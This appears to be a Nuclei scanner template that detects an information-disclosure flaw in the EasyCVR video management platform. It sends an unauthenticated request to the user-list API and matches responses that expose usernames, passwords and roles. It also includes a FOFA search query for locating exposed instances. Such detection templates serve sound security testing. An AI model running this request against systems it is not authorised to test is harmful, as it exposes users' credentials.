http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'Username":'
    - 'Password":'
    - 'count":'
    - 'RoleName":'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/v1/userlist?pageindex=0&pagesize=10'
id: easycvr-user-info-disclosure
info:
  author: dostghost
  description: 'The EasyCVR Video Management Platform is vulnerable to user information
    leakage. This template checks for exposed user information through the endpoint
    `/api/v1/userlist?pageindex=0&pagesize=10`.

    '
  metadata:
    fofa-query: title="EasyCVR"
  name: EasyCVR User - Information Disclosure
  reference:
  - https://github.com/AboSteam/POPC/blob/main/EasyCVR%20%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md
  severity: medium
  tags: exposure,easycvr,vuln
